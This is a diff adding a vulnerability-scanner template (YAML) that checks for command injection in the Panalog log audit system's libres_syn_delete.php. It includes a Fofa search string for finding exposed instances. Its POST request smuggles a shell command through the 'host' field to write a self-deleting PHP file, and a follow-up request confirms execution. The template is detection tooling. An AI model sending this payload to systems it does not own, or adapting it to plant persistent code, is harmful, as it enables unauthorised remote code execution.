@@ -1,0 +1,47 @@
+id: panalog-libres-syn-delete-rce
+
+info:
+  name: Panalog大数据日志审计系统libres_syn_delete.php存在命令执行
+  author: zan8in
+  severity: critical
+  description: |
+    Fofa: app="Panabit-Panalog"
+  reference:
+    - https://mp.weixin.qq.com/s/oj-ehgQV_zZgVxXznSUSVw
+  tags: panalog,rce
+flow: |
+  http("r0") && http("r1")
+
+variables:
+  filename: "{{rand_base(8)}}"
+
+http:
+  - id: "r0"
+    raw:
+      - |
+        POST /content-apply/libres_syn_delete.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        token=1&id=2&host=|echo "<?php echo 111*111;unlink(__FILE__);?>" >{{filename}}.php
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,"\"yn\"")
+        internal: true
+        condition: and
+
+  - id: "r1"
+    raw:
+      - |
+        GET /content-apply/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200 && contains(body,"12321")
+        condition: and
